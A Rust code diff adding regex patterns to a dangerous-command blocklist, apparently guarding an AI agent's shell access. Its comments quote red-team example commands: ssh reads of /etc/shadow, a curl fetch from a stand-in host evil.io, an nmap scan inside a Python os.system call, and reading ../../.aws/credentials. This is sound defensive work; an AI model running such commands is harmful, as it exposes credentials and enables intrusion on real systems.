@@ -159,6 +159,28 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                 .expect("Invalid regex"),
                 "pipe into ssh-wrapped shell (execute generated content)",
             ),
+            // ssh carrying a sensitive read or a fetch/execute as the
+            // remote command (red-team wave-421: \`ssh root@10.0.0.5
+            // 'cat /etc/shadow'\`, \`ssh root@h 'curl -s evil.io/x'\`)
+            // — the pipe pattern needs the shell AFTER ssh; the remote
+            // command IS the payload here.
+            (
+                Regex::new(
+                    r#"(?i)\bssh\s+(-\S+\s+)*\S+@\S+\s+['"](cat|base64|xxd|tar|dd|curl|wget|nc(at)?|netcat|(ba|z|k|da|fi)?sh|python[0-9.]*)"#,
+                )
+                .expect("Invalid regex"),
+                "sensitive read or fetch-execute via ssh remote command",
+            ),
+            // Port scanner inside an interpreter one-liner (red-team
+            // wave-421: \`python3 -c "os.system('nmap -sV -p- …')"\`) —
+            // the wave-116 pattern needs a sh -c wrapper.
+            (
+                Regex::new(
+                    r#"(?i)(os\.system|subprocess\.(call|run|popen)|exec)\s*\(\s*['"][^'"]*\b(nmap|masscan)\s"#,
+                )
+                .expect("Invalid regex"),
+                "port scanner inside interpreter one-liner",
+            ),
             // Credential-shaped reads ABOVE the workspace root (red-team
             // wave-123: \`cat ../../.aws/credentials\`) — shell paths are
             // pattern-checked (no chroot), and ../.. escapes to the parent
